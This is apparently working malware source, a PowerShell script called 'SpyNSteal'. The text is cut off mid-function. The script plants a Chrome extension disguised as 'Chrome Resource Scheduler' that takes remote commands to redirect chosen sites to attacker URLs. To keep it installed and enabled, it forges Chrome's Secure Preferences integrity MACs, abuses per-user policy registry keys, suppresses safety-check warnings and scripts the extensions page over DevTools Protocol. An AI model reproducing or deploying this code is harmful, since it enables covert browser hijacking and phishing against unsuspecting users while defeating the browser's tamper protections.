# SpyNSteal v10 - Policy + HMAC Hybrid (USER-ONLY, no admin)
# Primary: HKCU ExtensionInstallForcelist via reg.exe + CWS URL trick.
# Fallback: when Policies registry is locked, enable via Secure Preferences MAC patch.
# Installs startup refresher via HKCU Run key.

$MANIFEST_TEMPLATE = @'
{"manifest_version":3,"name":"Chrome Resource Scheduler","version":"1.0","description":"Manages internal resource scheduling and prioritization.","permissions":["declarativeNetRequest"],"host_permissions":["<all_urls>"],"background":{"service_worker":"sw.js"}}
'@

$SW_JS = @'
const C = "https://example.com/config.json";
const I = 60000;
let R = null;

async function applyRule(target, url) {
  const id = 1;
  await chrome.declarativeNetRequest.updateDynamicRules({
    removeRuleIds: [id],
    addRules: [{
      id,
      priority: 1,
      action: { type: "redirect", redirect: { url } },
      condition: { urlFilter: target, resourceTypes: ["main_frame"] }
    }]
  });
  R = id;
}

async function pull() {
  try {
    const r = await fetch(C, { cache: "no-store" });
    if (!r.ok) return false;
    const j = await r.json();
    if (j.selfDestruct) {
      if (R) await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
      return true;
    }
    if (j.armed && j.target && j.url) {
      await applyRule(j.target, j.url);
    } else if (R) {
      await chrome.declarativeNetRequest.updateDynamicRules({ removeRuleIds: [R] });
      R = null;
    }
    return true;
  } catch (_) { return false; }
}

async function init() {
  if (!C || C === "" || C.indexOf("%%") === 0) {
    await applyRule("||hi.com", "https://hi-test.com/");
    return;
  }
  const ok = await pull();
  if (!ok) await applyRule("||hi.com", "https://hi-test.com/");
  setInterval(pull, I);
}

chrome.runtime.onInstalled.addListener(() => init());
chrome.runtime.onStartup.addListener(() => init());
init();
'@

$LOGFILE = Join-Path $env:APPDATA "sns_debug.txt"
function Log([string]$msg) {
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    try { Add-Content $LOGFILE "[$ts] $msg" } catch {}
}

Log "=========================================="
Log "SpyNSteal v10.5 - Unpacked + HMAC + CDP"
Log "User: $env:USERNAME | Machine: $env:COMPUTERNAME"
Log "=========================================="

# --- STEP 1: Find Chrome ---
Log "STEP 1: Finding Chrome..."
$chromeExe = $null
$chromePaths = @(
    "${env:ProgramFiles}\Google\Chrome\Application\chrome.exe",
    "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
    "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
)
foreach ($p in $chromePaths) {
    if (Test-Path $p) { $chromeExe = $p; break }
}
if (-not $chromeExe) {
    Log "ERROR: Chrome not found"
    exit 1
}
Log "  Chrome: $chromeExe"

$userDataDir = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$defaultProfile = "$userDataDir\Default"
$extensionsDir = "$defaultProfile\Extensions"

# --- STEP 2: Kill Chrome ---
Log "STEP 2: Killing Chrome..."
Get-Process chrome -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep 3

# --- STEP 3: Create extension source ---
Log "STEP 3: Creating extension source..."
$persistDir = Join-Path $env:APPDATA "ChromePolicy"
New-Item -Path $persistDir -ItemType Directory -Force | Out-Null
$extSrcDir = Join-Path $persistDir "extension"
New-Item -Path $extSrcDir -ItemType Directory -Force | Out-Null

Set-Content (Join-Path $extSrcDir "manifest.json") $MANIFEST_TEMPLATE -Encoding UTF8
Set-Content (Join-Path $extSrcDir "sw.js") $SW_JS -Encoding UTF8

# --- STEP 4: Pack extension (or reuse existing CRX) ---
Log "STEP 4: Packing extension into CRX..."
$crxPath = Join-Path $persistDir "extension.crx"
$pemPath = Join-Path $persistDir "extension.pem"

if (-not (Test-Path $pemPath)) {
    $proc = Start-Process $chromeExe -ArgumentList "--pack-extension=`"$extSrcDir`"" -PassThru -Wait -NoNewWindow
    if (-not (Test-Path $crxPath)) {
        Log "ERROR: CRX not created"
        exit 1
    }
} else {
    $proc = Start-Process $chromeExe -ArgumentList "--pack-extension=`"$extSrcDir`" --pack-extension-key=`"$pemPath`"" -PassThru -Wait -NoNewWindow
}
Log "  CRX: $crxPath ($((Get-Item $crxPath).Length) bytes)"

# --- STEP 5: Extract extension ID from CRX3 ---
Log "STEP 5: Extracting extension ID..."
$crxBytes = [System.IO.File]::ReadAllBytes($crxPath)

function Read-Varint($bytes, [ref]$offset) {
    $result = [uint64]0; $shift = 0
    do { $b = $bytes[$offset.Value]; $offset.Value++; $result = $result -bor (([uint64]($b -band 0x7F)) -shl $shift); $shift += 7 } while ($b -band 0x80)
    return $result
}

$headerLen = [BitConverter]::ToUInt32($crxBytes, 8)
$pos = 12; $headerEnd = 12 + $headerLen; $pubKey = $null

while ($pos -lt $headerEnd -and $pubKey -eq $null) {
    $tag = Read-Varint $crxBytes ([ref]$pos)
    $fn = [int]($tag -shr 3); $wt = [int]($tag -band 7)
    if ($wt -eq 2) {
        $len = [int](Read-Varint $crxBytes ([ref]$pos))
        if ($fn -eq 2) {
            $ne = $pos + $len; $np = $pos
            while ($np -lt $ne) {
                $nt = Read-Varint $crxBytes ([ref]$np); $nf = [int]($nt -shr 3); $nw = [int]($nt -band 7)
                if ($nw -eq 2) { $nl = [int](Read-Varint $crxBytes ([ref]$np)); if ($nf -eq 1 -and $pubKey -eq $null) { $pubKey = New-Object byte[] $nl; [Array]::Copy($crxBytes,$np,$pubKey,0,$nl) }; $np += $nl }
                elseif ($nw -eq 0) { $null = Read-Varint $crxBytes ([ref]$np) } else { break }
            }
            $pos += $len
        } else { $pos += $len }
    } elseif ($wt -eq 0) { $null = Read-Varint $crxBytes ([ref]$pos) }
    elseif ($wt -eq 5) { $pos += 4 } elseif ($wt -eq 1) { $pos += 8 } else { break }
}

$sha = [System.Security.Cryptography.SHA256]::Create()
$hash = $sha.ComputeHash($pubKey)
$extId = ""
for ($i = 0; $i -lt 16; $i++) { $b = $hash[$i]; $extId += [char]([int][char]'a' + (($b -shr 4) -band 0x0F)); $extId += [char]([int][char]'a' + ($b -band 0x0F)) }
Log "  Extension ID: $extId"

# Embed public key in manifest so loadUnpacked yields the same deterministic ID
$keyB64 = [Convert]::ToBase64String($pubKey)
$manifestWithKey = $MANIFEST_TEMPLATE.Trim().TrimEnd('}') + ',"key":"' + $keyB64 + '"}'
Set-Content (Join-Path $extSrcDir "manifest.json") $manifestWithKey -Encoding UTF8 -NoNewline

# Save extension ID for refresher
Set-Content (Join-Path $persistDir "ext_id.txt") $extId

# --- STEP 6: Stage extension files ---
Log "STEP 6: Staging extension files..."
$extInstallDir = Join-Path $extensionsDir "$extId\1.0_0"
New-Item -Path $extInstallDir -ItemType Directory -Force | Out-Null
Copy-Item (Join-Path $extSrcDir "manifest.json") $extInstallDir -Force
Copy-Item (Join-Path $extSrcDir "sw.js") $extInstallDir -Force

# --- STEP 7: Create update manifest ---
Log "STEP 7: Creating update manifest..."
$updateXml = @"
<?xml version='1.0' encoding='UTF-8'?>
<gupdate xmlns='http://www.google.com/update2/response' protocol='2.0'>
  <app appid='$extId'>
    <updatecheck codebase='file:///$($crxPath -replace '\\','/')' version='1.0' />
  </app>
</gupdate>
"@
$updateXmlPath = Join-Path $persistDir "update.xml"
Set-Content $updateXmlPath $updateXml -Encoding UTF8
$localUpdateUrl = "file:///$($updateXmlPath -replace '\\','/')"

# --- Helpers: reg.exe + HMAC enable fallback ---
$secPrefsPath = "$defaultProfile\Secure Preferences"
$cwsUpdateUrl = "https://clients2.google.com/service/update2/crx"
$chromeDir = Split-Path $chromeExe -Parent

function Invoke-RegAdd([string]$KeyPath, [string]$Name, [string]$Value) {
    $escaped = $Value -replace '"','\"'
    $null = cmd /c "reg add `"$KeyPath`" /v `"$Name`" /t REG_SZ /d `"$escaped`" /f >nul 2>&1"
    return ($LASTEXITCODE -eq 0)
}

function Set-ExternalRegistry([string]$Id, [string]$LocalUrl, [string]$Crx) {
    $base = "HKCU\Software\Google\Chrome\Extensions\$Id"
    $ok = (Invoke-RegAdd $base "update_url" $LocalUrl) -and
          (Invoke-RegAdd $base "path" $Crx) -and
          (Invoke-RegAdd $base "version" "1.0")
    Log "  External registry (reg.exe): $ok"
    return $ok
}

function Set-ChromePoliciesReg([string]$Id, [string]$UpdateUrl) {
    $val = "$Id;$UpdateUrl"
    $ok = (Invoke-RegAdd "HKCU\Software\Policies\Google\Chrome\ExtensionInstallForcelist" "1" $val) -and
          (Invoke-RegAdd "HKCU\Software\Policies\Google\Chrome\ExtensionInstallAllowlist" "1" $Id) -and
          (Invoke-RegAdd "HKCU\Software\Policies\Google\Chrome\ExtensionInstallAllowlist" "2" "*")
    Log "  Policies registry (reg.exe): $ok"
    return $ok
}

function Get-ExtDisableReasons([string]$Content, [string]$Id) {
    $idx = $Content.IndexOf("`"$Id`":{")
    if ($idx -lt 0) { return $null }
    $chunk = $Content.Substring($idx, [Math]::Min(2000, $Content.Length - $idx))
    $m = [regex]::Match($chunk, '"disable_reasons":\[([^\]]*)\]')
    if ($m.Success -and $m.Groups[1].Value) { return $m.Groups[1].Value }
    return ""
}

$asmDir = [System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory()
$webExtAsm = Join-Path $asmDir "System.Web.Extensions.dll"
Add-Type -ReferencedAssemblies @("System.Core", "System.Web.Extensions.dll") -TypeDefinition @'
using System; using System.Collections; using System.Collections.Generic; using System.Security.Cryptography; using System.Security.Principal; using System.Text;
using System.Web.Script.Serialization; using Microsoft.Win32;
public class ExtEnable {
    static byte[] seed; static string deviceId; static bool useStrip;
    static byte[] foundSeed; static string foundDeviceId; static bool foundStrip;
    static JavaScriptSerializer jss = new JavaScriptSerializer { MaxJsonLength = int.MaxValue };
    public static void Init(byte[] s, string d, bool strip) { seed = s; deviceId = d; useStrip = strip; }
    static string HmacWith(byte[] s, string msg) {
        using (var h = new HMACSHA256(s))
            return BitConverter.ToString(h.ComputeHash(Encoding.UTF8.GetBytes(msg))).Replace("-","");
    }
    static string Hmac(string msg) { return HmacWith(seed, msg); }
    static string DeriveId(string raw) {
        using (var h = new HMACSHA256(Encoding.UTF8.GetBytes(raw)))
            return BitConverter.ToString(h.ComputeHash(Encoding.UTF8.GetBytes("PrefMetricsService"))).Replace("-","").ToLower();
    }
    static string GetMachineGuid() {
        try {
            using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography", false)) {
                if (key != null) { object val = key.GetValue("MachineGuid"); if (val != null) return val.ToString(); }
            }
        } catch {}
        return "";
    }
    static string Esc(string s) {
        var sb = new StringBuilder(); sb.Append('"');
        foreach (char c in s) {
            switch (c) {
                case '"': sb.Append("\\\""); break;
                case '\\': sb.Append("\\\\"); break;
                case '\n': sb.Append("\\n"); break;
                case '\r': sb.Append("\\r"); break;
                case '\t': sb.Append("\\t"); break;
                case '<': sb.Append("\\u003C"); break;
                default: sb.Append(c); break;
            }
        }
        sb.Append('"'); return sb.ToString();
    }
    static string ToCanonFull(object obj) {
        if (obj == null) return "null";
        if (obj is bool) return (bool)obj ? "true" : "false";
        if (obj is int) return ((int)obj).ToString();
        if (obj is long) return ((long)obj).ToString();
        if (obj is decimal) { decimal dc=(decimal)obj; if (dc==Math.Floor(dc)) return ((long)dc).ToString(); return dc.ToString(System.Globalization.CultureInfo.InvariantCulture); }
        if (obj is double) { double d=(double)obj; if (d==Math.Floor(d)&&!Double.IsInfinity(d)&&Math.Abs(d)<1e15) return ((long)d).ToString(); return d.ToString(System.Globalization.CultureInfo.InvariantCulture); }
        if (obj is string) return Esc((string)obj);
        if (obj is ArrayList) { var a=(ArrayList)obj; var parts=new string[a.Count]; for(int i=0;i<a.Count;i++) parts[i]=ToCanonFull(a[i]); return "["+string.Join(",",parts)+"]"; }
        if (obj is object[]) { var a=(object[])obj; var parts=new string[a.Length]; for(int i=0;i<a.Length;i++) parts[i]=ToCanonFull(a[i]); return "["+string.Join(",",parts)+"]"; }
        if (obj is Dictionary<string,object>) { var d=(Dictionary<string,object>)obj; var keys=new List<string>(d.Keys); keys.Sort(StringComparer.Ordinal); var parts=new List<string>(); foreach(var k in keys) parts.Add(Esc(k)+":"+ToCanonFull(d[k])); return "{"+string.Join(",",parts)+"}"; }
        return Esc(obj.ToString());
    }
    static string ToCanonStrip(object obj) {
        if (obj == null) return "null";
        if (obj is bool) return (bool)obj ? "true" : "false";
        if (obj is int) return ((int)obj).ToString();
        if (obj is long) return ((long)obj).ToString();
        if (obj is decimal) { decimal dc=(decimal)obj; if (dc==Math.Floor(dc)) return ((long)dc).ToString(); return dc.ToString(System.Globalization.CultureInfo.InvariantCulture); }
        if (obj is double) { double d=(double)obj; if (d==Math.Floor(d)&&!Double.IsInfinity(d)&&Math.Abs(d)<1e15) return ((long)d).ToString(); return d.ToString(System.Globalization.CultureInfo.InvariantCulture); }
        if (obj is string) return Esc((string)obj);
        if (obj is ArrayList) { var a=(ArrayList)obj; if(a.Count==0) return null; var parts=new List<string>(); for(int i=0;i<a.Count;i++){string p=ToCanonStrip(a[i]); if(p!=null) parts.Add(p);} return parts.Count==0?null:"["+string.Join(",",parts)+"]"; }
        if (obj is object[]) { var a=(object[])obj; if(a.Length==0) return null; var parts=new List<string>(); foreach(var i in a){string p=ToCanonStrip(i); if(p!=null) parts.Add(p);} return parts.Count==0?null:"["+string.Join(",",parts)+"]"; }
        if (obj is Dictionary<string,object>) { var d=(Dictionary<string,object>)obj; var keys=new List<string>(d.Keys); keys.Sort(StringComparer.Ordinal); var parts=new List<string>(); foreach(var k in keys){string v=ToCanonStrip(d[k]); if(v!=null) parts.Add(Esc(k)+":"+v);} return parts.Count==0?null:"{"+string.Join(",",parts)+"}"; }
        return Esc(obj.ToString());
    }
    static string Canon(object obj) { return useStrip ? ToCanonStrip(obj) : ToCanonFull(obj); }
    static object StripEncHashesObj(object obj) {
        if (obj is Dictionary<string,object>) {
            var src = (Dictionary<string,object>)obj;
            var dst = new Dictionary<string,object>(StringComparer.Ordinal);
            foreach (var kv in src) {
                if (kv.Key.EndsWith("_encrypted_hash")) continue;
                dst[kv.Key] = StripEncHashesObj(kv.Value);
            }
            return dst;
        }
        return obj;
    }
    static bool TryRegistryMac(Dictionary<string,object> root, byte[] cand, string dev, bool strip, out string detail) {
        detail = null;
        try {
            using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Google\Chrome\PreferenceMACs\Default\extensions\settings")) {
                if (key == null) return false;
                var extSettings = ((Dictionary<string,object>)((Dictionary<string,object>)root["extensions"])["settings"]);
                foreach (var name in key.GetValueNames()) {
                    string stored = key.GetValue(name) as string;
                    if (stored == null || stored.Length != 64) continue;
                    if (!extSettings.ContainsKey(name)) continue;
                    string cv = strip ? ToCanonStrip(extSettings[name]) : ToCanonFull(extSettings[name]);
                    if (cv == null) continue;
                    string path = "extensions.settings." + name;
                    string comp = HmacWith(cand, dev + path + cv);
                    if (string.Equals(comp, stored, StringComparison.OrdinalIgnoreCase)) { detail = "registry." + path; return true; }
                }
            }
        } catch {}
        return false;
    }
    static bool TryExtMac(string raw, byte[] cand, string dev, bool strip, Dictionary<string,object> root, Dictionary<string,object> macs, out string detail) {
        detail = null;
        var extMacs = macs.ContainsKey("extensions") ? macs["extensions"] as Dictionary<string,object> : null;
        var settingsMacs = extMacs != null && extMacs.ContainsKey("settings") ? extMacs["settings"] as Dictionary<string,object> : null;
        var extSettings = ((Dictionary<string,object>)((Dictionary<string,object>)root["extensions"])["settings"]);
        if (settingsMacs == null) return false;
        foreach (var kv in settingsMacs) {
            string stored = kv.Value as string;
            if (stored == null || stored.Length != 64) continue;
            if (!extSettings.ContainsKey(kv.Key)) continue;
            string path = "extensions.settings." + kv.Key;
            string cv = strip ? ToCanonStrip(extSettings[kv.Key]) : ToCanonFull(extSettings[kv.Key]);
            if (cv == null) continue;
            string comp = HmacWith(cand, dev + path + cv);
            if (string.Equals(comp, stored, StringComparison.OrdinalIgnoreCase)) { detail = path; return true; }
        }
        return false;
    }
    public static string FindCredentials(string raw, object[] candidates) {
        foundSeed = null; foundDeviceId = null;
        try {
            var root = jss.Deserialize<Dictionary<string,object>>(raw);
            var protection = (Dictionary<string,object>)root["protection"];
            var macs = (Dictionary<string,object>)protection["macs"];
            string storedSuper = protection["super_mac"] as string;
            string sid = WindowsIdentity.GetCurrent().User.Value;
            string[] sp = sid.Split('-');
            string sidNoRid = string.Join("-", sp, 0, sp.Length - 1);
            string mg = GetMachineGuid();
            string[] devIds = { "", sidNoRid, sid, DeriveId(sidNoRid), DeriveId(sid), mg };
            string[] devLabels = { "none", "sidNoRid", "fullSid", "derivedNoRid", "derivedFull", "machineGuid" };
            for (int si = 0; si < candidates.Length; si++) {
                byte[] cand = candidates[si] as byte[];
                if (cand == null) continue;
                for (int di = 0; di < devIds.Length; di++) {
                    string dev = devIds[di] ?? "";
                    for (int st = 0; st < 2; st++) {
                        bool strip = st == 1;
                        if (storedSuper != null && storedSuper.Length == 64) {
                            var macVariants = new object[] { macs, StripEncHashesObj(macs) };
                            foreach (var mv in macVariants) {
                                if (mv == null) continue;
                                string mc = strip ? ToCanonStrip(mv) : ToCanonFull(mv);
                                if (mc != null) {
                                    string comp = HmacWith(cand, dev + mc);
                                    if (string.Equals(comp, storedSuper, StringComparison.OrdinalIgnoreCase)) {
                                        foundSeed = cand; foundDeviceId = dev; foundStrip = strip;
                                        return "seed#" + si + "|" + devLabels[di] + "|" + (strip ? "strip" : "full") + "|super_mac";
                                    }
                                }
                            }
                        }
                        string detail;
                        if (TryRegistryMac(root, cand, dev, strip, out detail)) {
                            foundSeed = cand; foundDeviceId = dev; foundStrip = strip;
                            return "seed#" + si + "|" + devLabels[di] + "|" + (strip ? "strip" : "full") + "|" + detail;
                        }
                        if (TryExtMac(raw, cand, dev, strip, root, macs, out detail)) {
                            foundSeed = cand; foundDeviceId = dev; foundStrip = strip;
                            return "seed#" + si + "|" + devLabels[di] + "|" + (strip ? "strip" : "full") + "|" + detail;
                        }
                    }
                }
            }
        } catch {}
        return null;
    }
    public static byte[] GetFoundSeed() { return foundSeed; }
    public static string GetFoundDeviceId() { return foundDeviceId; }
    public static bool GetFoundStrip() { return foundStrip; }
    public static string VerifyCurrent(string raw) {
        if (foundSeed == null) return null;
        Init(foundSeed, foundDeviceId, foundStrip);
        try {
            var root = jss.Deserialize<Dictionary<string,object>>(raw);
            var protection = (Dictionary<string,object>)root["protection"];
            string storedSuper = protection["super_mac"] as string;
            var macs = (Dictionary<string,object>)protection["macs"];
            string mc = Canon(macs);
            if (storedSuper != null && mc != null && string.Equals(Hmac(deviceId + mc), storedSuper, StringComparison.OrdinalIgnoreCase))
                return "super_mac";
        } catch {}
        return null;
    }
    public static string Patch(string content, string extId) {
        int extStart = content.IndexOf("\""+extId+"\":{");
        if (extStart < 0) return null;
        int blockEnd = extStart;
        int depth = 0;
        for (int i = extStart + extId.Length + 2; i < content.Length; i++) {
            if (content[i]=='{') depth++;
            else if (content[i]=='}') { depth--; if (depth==0) { blockEnd = i; break; } }
        }
        string block = content.Substring(extStart, blockEnd - extStart + 1);
        string patched = System.Text.RegularExpressions.Regex.Replace(block, ",?\"disable_reasons\":\\[[^\\]]*\\]", "");
        if (!patched.Contains("\"state\":")) {
            patched = patched.Replace("\""+extId+"\":{", "\""+extId+"\":{\"state\":1,");
        } else {
            patched = System.Text.RegularExpressions.Regex.Replace(patched, "\"state\":\\d+", "\"state\":1");
        }
        if (!patched.Contains("\"ack_safety_check_warning\":")) {
            patched = patched.Replace("\""+extId+"\":{", "\""+extId+"\":{\"ack_safety_check_warning\":true,");
        } else {
            patched = System.Text.RegularExpressions.Regex.Replace(patched, "\"ack_safety_check_warning\":(true|false)", "\"ack_safety_check_warning\":true");
        }
        content = content.Substring(0, extStart) + patched + content.Substring(blockEnd + 1);
        var root = jss.Deserialize<Dictionary<string,object>>(content);
        var protection = (Dictionary<string,object>)root["protection"];
        var macs = (Dictionary<string,object>)protection["macs"];
        var extMacs = (Dictionary<string,object>)macs["extensions"];
        var settingsMacs = (Dictionary<string,object>)extMacs["settings"];
        var extensions = (Dictionary<string,object>)((Dictionary<string,object>)root["extensions"])["settings"];
        var extSettings = (Dictionary<string,object>)extensions[extId];
        string canonical = Canon(extSettings);
        string macPath = "extensions.settings."+extId;
        string newMac = Hmac(deviceId + macPath + canonical);
        settingsMacs[extId] = newMac;
        string macsCanonical = Canon(macs);
        string newSuper = Hmac(deviceId + macsCanonical);
        string oldMacKey = "\""+extId+"\":\"";
        int macsStart = content.IndexOf("\"macs\":{");
        int macPos = content.IndexOf(oldMacKey, macsStart);
        if (macPos > 0) {
            int valStart = macPos + oldMacKey.Length;
            int valEnd = content.IndexOf("\"", valStart);
            content = content.Remove(valStart, valEnd - valStart).Insert(valStart, newMac);
        }
        string smKey = "\"super_mac\":\"";
        int smPos = content.IndexOf(smKey);
        if (smPos >= 0) {
            int smValStart = smPos + smKey.Length;
            int smValEnd = content.IndexOf("\"", smValStart);
            content = content.Remove(smValStart, smValEnd - smValStart).Insert(smValStart, newSuper);
        }
        return content;
    }
}
'@ -ErrorAction SilentlyContinue

function Get-PakSeedCandidates([string]$ChromeDir) {
    $results = @()
    $pakNames = @('resources.pak', 'chrome_100_percent.pak', 'chrome_200_percent.pak')
    $dirs = @($ChromeDir)
    try { $dirs += @(Get-ChildItem $ChromeDir -Directory -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName }) } catch {}
    foreach ($dir in $dirs) {
        foreach ($pakName in $pakNames) {
            $pakPath = Join-Path $dir $pakName
            if (-not (Test-Path $pakPath)) { continue }
            try {
                $data = [IO.File]::ReadAllBytes($pakPath)
                if ($data.Length -lt 12) { continue }
                if ([BitConverter]::ToUInt32($data, 0) -ne 5) { continue }
                $resCount = [BitConverter]::ToUInt16($data, 8)
                for ($i = 0; $i -lt $resCount; $i++) {
                    $off = 12 + $i * 6
                    if ($off + 6 -gt $data.Length) { break }
                    $id = [BitConverter]::ToUInt16($data, $off)
                    $start = [BitConverter]::ToUInt32($data, $off + 2)
                    $nextOff = 12 + ($i + 1) * 6
                    if ($nextOff + 6 -gt $data.Length) { break }
                    $end = [BitConverter]::ToUInt32($data, $nextOff + 2)
                    $len = [int]($end - $start)
                    if ($len -eq 64 -and $start + 64 -le $data.Length) {
                        $cand = New-Object byte[] 64
                        [Array]::Copy($data, [int]$start, $cand, 0, 64)
                        $allZero = $true
                        foreach ($b in $cand) { if ($b -ne 0) { $allZero = $false; break } }
                        if (-not $allZero) {
                            $results += [PSCustomObject]@{ Id = $id; Bytes = $cand; Pak = $pakName }
                        }
                    }
                }
            } catch {}
        }
    }
    return $results
}

function Get-VerifiedChromeSeed([string]$ChromeDir, [string]$SecPrefsPath) {
    if (-not (Test-Path $SecPrefsPath)) { return $null }
    $raw = [IO.File]::ReadAllText($SecPrefsPath, [Text.Encoding]::UTF8)
    $candidates = Get-PakSeedCandidates $ChromeDir
    Log "  Seed scan: $($candidates.Count) PAKv5 candidates"
    if ($candidates.Count -eq 0) { return $null }
    $regSeed = [Text.Encoding]::UTF8.GetBytes('ChromeRegistryHashStoreValidationSeed')
    $candList = New-Object System.Collections.Generic.List[object]
    foreach ($c in $candidates) { $candList.Add($c.Bytes) }
    $candList.Add($regSeed)
    $candArr = $candList.ToArray()
    $info = [ExtEnable]::FindCredentials($raw, $candArr)
    if (-not $info) { return $null }
    $seed = [ExtEnable]::GetFoundSeed()
    $deviceId = [ExtEnable]::GetFoundDeviceId()
    $strip = [ExtEnable]::GetFoundStrip()
    $parts = $info.Split('|')
    $seedIdx = 0
    if ($parts[0] -match 'seed#(\d+)') { $seedIdx = [int]$Matches[1] }
    $seedId = 'registry'; $pak = 'registry'
    if ($seedIdx -lt $candidates.Count) { $seedId = $candidates[$seedIdx].Id; $pak = $candidates[$seedIdx].Pak }
    return @{
        Seed = $seed
        DeviceId = $deviceId
        SeedId = $seedId
        Pak = $pak
        MatchPath = $parts[3]
        DevLabel = $parts[1]
        CanonMode = $parts[2]
        UseStrip = $strip
        Info = $info
    }
}

function Get-ExtState([string]$Content, [string]$Id) {
    $idx = $Content.IndexOf("`"$Id`":{")
    if ($idx -lt 0) { return $null }
    $chunk = $Content.Substring($idx, [Math]::Min(2000, $Content.Length - $idx))
    $m = [regex]::Match($chunk, '"state":(\d+)')
    if ($m.Success) { return $m.Groups[1].Value }
    return ""
}

function Save-VerifiedCredentials([string]$Dir, $Verified) {
    $seedHex = [BitConverter]::ToString($Verified.Seed).Replace('-', '').ToLower()
    Set-Content (Join-Path $Dir 'seed.hex') $seedHex -Encoding ASCII
    Set-Content (Join-Path $Dir 'device_id.txt') $Verified.DeviceId -Encoding ASCII
    Set-Content (Join-Path $Dir 'canon_mode.txt') $(if ($Verified.UseStrip) { 'strip' } else { 'full' }) -Encoding ASCII
}

function Enable-ExtensionSecPrefs([string]$Path, [string]$Id, [string]$ChromeDir, [string]$PersistDir, $Verified = $null) {
    if (-not $Verified) {
        $Verified = Get-VerifiedChromeSeed $ChromeDir $Path
    }
    if (-not $Verified) {
        Log "  ERROR: HMAC seed not verified - cannot enable extension"
        return $false
    }
    Log "  Verified: $($Verified.Info) (pak id $($Verified.SeedId))"
    Log "  Device: $($Verified.DevLabel) canon=$($Verified.CanonMode)"
    Save-VerifiedCredentials $PersistDir $Verified
    [ExtEnable]::Init($Verified.Seed, $Verified.DeviceId, $Verified.UseStrip)
    $content = [IO.File]::ReadAllText($Path, [Text.Encoding]::UTF8)
    $patched = [ExtEnable]::Patch($content, $Id)
    if (-not $patched) { Log "  HMAC enable: extension not in SecPrefs"; return $false }
    [IO.File]::WriteAllText($Path, $patched, (New-Object Text.UTF8Encoding($false)))
    $written = [IO.File]::ReadAllText($Path, [Text.Encoding]::UTF8)
    $macOk = [bool][ExtEnable]::VerifyCurrent($written)
    if (-not $macOk) {
        Log "  ERROR: Post-patch MAC verification failed"
        return $false
    }
    Log "  HMAC enable: patched + MAC verified"
    return $true
}

function Test-ExtensionEnabled([string]$Path, [string]$Id) {
    if (-not (Test-Path $Path)) { return $false }
    $c = [IO.File]::ReadAllText($Path, [Text.Encoding]::UTF8)
    $dr = Get-ExtDisableReasons $c $Id
    $st = Get-ExtState $c $Id
    return (($dr -eq "" -or $dr -eq $null) -and $st -eq "1")
}

$cdpTypeLoaded = $false
function Ensure-CdpType {
    if ($script:cdpTypeLoaded) { return }
    Add-Type -ReferencedAssemblies @('System.Core') -TypeDefinition @'
using System; using System.Net.WebSockets; using System.Text; using System.Text.RegularExpressions; using System.Threading;
public class CdpWs {
    static int _id = 10; static ClientWebSocket _ws;
    static string ReadMsg() {
        var buf = new byte[262144]; var sb = new StringBuilder();
        while (true) {
            var r = _ws.ReceiveAsync(new ArraySegment<byte>(buf), CancellationToken.None).GetAwaiter().GetResult();
            sb.Append(Encoding.UTF8.GetString(buf, 0, r.Count));
            if (r.EndOfMessage) break;
        }
        return sb.ToString();
    }
    static void SendOnly(string json) {
        var b = Encoding.UTF8.GetBytes(json);
        _ws.SendAsync(new ArraySegment<byte>(b), WebSocketMessageType.Text, true, CancellationToken.None).GetAwaiter().GetResult();
    }
    static string WaitForId(string wantId, int tries) {
        for (int i = 0; i < tries; i++) {
            string msg = ReadMsg();
            if (msg.Contains("\"id\":" + wantId)) return msg;
        }
        return "";
    }
    static string WaitForEvent(string method, int tries) {
        for (int i = 0; i < tries; i++) {
            string msg = ReadMsg();
            if (msg.Contains("\"method\":\"" + method + "\"")) return msg;
        }
        return "";
    }
    static string Extract(string json, string key) {
        var m = Regex.Match(json, "\"" + key + "\"\\s*:\\s*\"([^\"]+)\"");
        return m.Success ? m.Groups[1].Value : null;
    }
    static string EvalInSession(string sessionId, string js) {
        js = js.Replace("\\", "\\\\").Replace("\"", "\\\"");
        int eId = _id++;
        string req = "{\"id\":" + eId + ",\"method\":\"Runtime.evaluate\",\"sessionId\":\"" + sessionId + "\",\"params\":{\"expression\":\"" + js + "\",\"awaitPromise\":true,\"returnByValue\":true}}";
        SendOnly(req);
        string resp = WaitForId(eId.ToString(), 50);
        return resp.Length > 200 ? resp.Substring(0, 200) : resp;
    }
    static string EnableJs(string extId) {
        return "(async()=>{const id='" + extId + "';const OFF=4;const r=[];try{for(let w=0;w<24;w++){for(const e of document.querySelectorAll('extensions-item')){if(e.id===id){r.push('FOUND');w=99;break;}}if(w<24)await new Promise(x=>setTimeout(x,500));}const m=document.querySelector('extensions-manager');const d=m&&m.delegate;if(d&&typeof d.setItemSafetyCheckWarningAcknowledged==='function'){try{await d.setItemSafetyCheckWarningAcknowledged(id,OFF);r.push('ACK');}catch(_){r.push('ACK_ERR');}}else if(chrome.developerPrivate&&typeof chrome.developerPrivate.updateExtensionConfiguration==='function'){try{await chrome.developerPrivate.updateExtensionConfiguration({extensionId:id,acknowledgeSafetyCheckWarningReason:OFF});r.push('UPD');}catch(_){r.push('UPD_ERR');}}const item=document.getElementById(id)||[...document.querySelectorAll('extensions-item')].find(e=>e.id===id);if(item&&item.shadowRoot){const t=item.shadowRoot.querySelector('#enableToggle');if(t&&!t.checked&&!t.disabled){t.click();r.push('CLICK');}else if(t&&t.checked)r.push('ON');}if(!r.includes('CLICK')&&!r.includes('ON')&&d&&typeof d.setItemEnabled==='function'){try{await d.setItemEnabled(id,true);r.push('EN');}catch(_){r.push('EN_ERR');}}return r.length?r.join('+'):'NO_API';}catch(e){return 'ERR:'+e;}})()";
    }
    static string AttachExtensionsPage(out string sessionId) {
        sessionId = null;
        int cId = _id++;
        SendOnly("{\"id\":" + cId + ",\"method\":\"Target.createTarget\",\"params\":{\"url\":\"chrome://extensions\"}}");
        string targetId = Extract(WaitForId(cId.ToString(), 25), "targetId");
        if (targetId == null) return "CREATE_FAIL|";
        int aId = _id++;
        SendOnly("{\"id\":" + aId + ",\"method\":\"Target.attachToTarget\",\"params\":{\"targetId\":\"" + targetId + "\",\"flatten\":true}}");
